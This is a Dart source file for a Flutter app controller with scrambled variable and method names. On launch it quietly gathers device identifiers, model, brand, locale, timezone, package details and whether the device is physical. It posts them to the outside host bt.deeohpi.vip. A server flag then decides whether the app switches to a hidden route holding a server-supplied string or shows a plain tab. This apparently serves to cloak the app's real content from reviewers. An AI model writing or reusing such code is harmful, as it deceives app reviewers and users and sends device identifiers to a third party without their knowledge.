import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkConnect() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/refresh");
  }
}

class PageLogic extends GetxController {

  var zjvpxckmf = RxBool(false);
  var docrxwl = RxBool(true);
  var jflbsgua = RxString("");
  var flossie = RxBool(false);
  var rempel = RxBool(true);
  final jvcxhpb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    checkConnect();
    orxnbgh();
  }


  Future<void> orxnbgh() async {

    flossie.value = true;
    rempel.value = true;
    docrxwl.value = false;

    jvcxhpb.post("https://bt.deeohpi.vip/BDUT9YFX",data: await wrqnuyi()).then((value) {
      var ibhgvrt = value.data["ibhgvrt"] as String;
      var rkymjutx = value.data["rkymjutx"] as bool;
      if (rkymjutx) {
        jflbsgua.value = ibhgvrt;
        libbie();
      } else {
        jacobs();
      }
    }).catchError((e) {
      docrxwl.value = true;
      rempel.value = true;
      flossie.value = false;
    });
  }

  Future<Map<String, dynamic>> wrqnuyi() async {
    final DeviceInfoPlugin okiywlsh = DeviceInfoPlugin();
    PackageInfo ykinc_udmhyr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var cbdesfrz = Platform.localeName;
    var ogup = currentTimeZone;

    var qznkw = ykinc_udmhyr.packageName;
    var gdhf = ykinc_udmhyr.version;
    var jlqkexvs = ykinc_udmhyr.buildNumber;

    var gfzr = ykinc_udmhyr.appName;
    var ousm  = "";
    var leanneRutherford = "";
    var eizsqc = "";
    var idellSchoen = "";
    var kevenLowe = "";


    var zutgemfv = "";
    var eyitudmc = "";
    var kayliTurner = "";
    var whyjt = false;

    if (GetPlatform.isAndroid) {
      eyitudmc = "android";
      var aedntfvul = await okiywlsh.androidInfo;

      eizsqc = aedntfvul.brand;

      zutgemfv  = aedntfvul.model;
      ousm = aedntfvul.id;

      whyjt = aedntfvul.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      eyitudmc = "ios";
      var dfhwbkcya = await okiywlsh.iosInfo;
      eizsqc = dfhwbkcya.name;
      zutgemfv = dfhwbkcya.model;

      ousm = dfhwbkcya.identifierForVendor ?? "";
      whyjt  = dfhwbkcya.isPhysicalDevice;
    }

    var res = {
      "gfzr": gfzr,
      "gdhf": gdhf,
      "idellSchoen" : idellSchoen,
      "qznkw": qznkw,
      "ogup": ogup,
      "eizsqc": eizsqc,
      "ousm": ousm,
      "leanneRutherford" : leanneRutherford,
      "cbdesfrz": cbdesfrz,
      "eyitudmc": eyitudmc,
      "whyjt": whyjt,
      "jlqkexvs": jlqkexvs,
      "kevenLowe" : kevenLowe,
      "zutgemfv": zutgemfv,
      "kayliTurner" : kayliTurner,

    };
    return res;
  }

  Future<void> jacobs() async {
    Get.offAllNamed("/motionTab");
  }

  Future<void> libbie() async {
    Get.offAllNamed("/motionStart");
  }

}
